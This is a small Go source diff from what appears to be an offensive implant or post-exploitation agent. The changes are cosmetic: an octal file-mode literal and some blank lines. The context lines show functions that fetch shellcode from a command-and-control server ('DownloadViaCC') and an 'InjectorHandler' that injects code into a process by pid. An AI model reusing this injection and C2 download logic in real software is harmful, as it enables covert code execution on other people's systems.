@@ -101,7 +101,7 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 		if err != nil {
 			return "", fmt.Errorf("Extract loader.so failed: %v", err)
 		}
-		err = os.WriteFile(so_path, out, 0644)
+		err = os.WriteFile(so_path, out, 0o644)
 		if err != nil {
 			return "", fmt.Errorf("Write loader.so failed: %v", err)
 		}
@@ -161,7 +161,6 @@ func prepare_shared_lib() (path string, err error) {
 // prepare the shellcode
 func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
 	sc, err := DownloadViaCC("shellcode.txt", "")
-
 	if err != nil {
 		log.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
@@ -185,7 +184,6 @@ func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
 
 // InjectorHandler handles `injector` module
 func InjectorHandler(pid int, method string) (err error) {
-
 	// dispatch
 	switch method {
 
